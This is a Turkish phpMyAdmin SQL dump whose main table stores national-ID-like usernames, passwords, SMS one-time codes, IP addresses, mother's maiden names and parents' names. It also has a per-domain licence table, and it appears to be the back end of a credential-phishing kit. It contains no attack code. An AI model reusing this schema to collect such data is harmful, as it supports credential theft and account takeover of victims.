-- phpMyAdmin SQL Dump
-- version 4.6.6
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost:3306
-- Üretim Zamanı: 17 Oca 2018, 03:23:00
-- Sunucu sürümü: 5.5.56-MariaDB
-- PHP Sürümü: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `wild_zii`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ak`
--

CREATE TABLE `ak` (
  `id` int(11) NOT NULL,
  `kullanici` text NOT NULL,
  `tarih` text NOT NULL,
  `telnum` text NOT NULL,
  `pass` text NOT NULL,
  `notif` int(11) NOT NULL,
  `ses` int(11) NOT NULL,
  `sms1` varchar(266) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `sms2` varchar(256) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `kadi` text NOT NULL,
  `kizlik` text NOT NULL,
  `anneadi` text NOT NULL,
  `babaadi` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `ak`
--

INSERT INTO `ak` (`id`, `kullanici`, `tarih`, `telnum`, `pass`, `notif`, `ses`, `sms1`, `ip`, `sms2`, `kadi`, `kizlik`, `anneadi`, `babaadi`) VALUES
(1, '23109238109', '2018-01-17 03:19:18', '', '098098', 0, 1, '123123', '94.123.194.160', '', '', 'anne kizlik', 'anne adi', 'baba adi');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ip`
--

CREATE TABLE `ip` (
  `ip` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `lisans`
--

CREATE TABLE `lisans` (
  `is` int(11) NOT NULL,
  `domain` varchar(64) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `ak`
--
ALTER TABLE `ak`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `lisans`
--
ALTER TABLE `lisans`
  ADD PRIMARY KEY (`is`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `ak`
--
ALTER TABLE `ak`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- Tablo için AUTO_INCREMENT değeri `lisans`
--
ALTER TABLE `lisans`
  MODIFY `is` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
